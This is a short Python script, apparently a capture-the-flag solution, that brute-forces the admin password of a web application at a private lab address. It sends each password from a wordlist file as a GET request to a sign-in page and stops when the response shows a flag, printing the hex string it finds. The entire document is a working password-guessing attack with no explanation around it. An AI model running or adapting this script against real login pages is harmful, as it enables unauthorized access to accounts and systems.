#!usr/bin/python3
import requests
import re

ip = '192.168.56.104'
fd = open('passwd', 'r')
for passwd in fd.readlines():
    passwd = passwd.replace('\n', '')
    r = requests.get('http://{}/index.php?page=signin&username=admin&password={}&Login=Login#'.format(ip, passwd))
    print(passwd)
    if 'flag' in r.text:
        flag = re.findall(r'([a-fA-F0-9]{10,})', r.text)
        print(flag[0])
        exit(0)
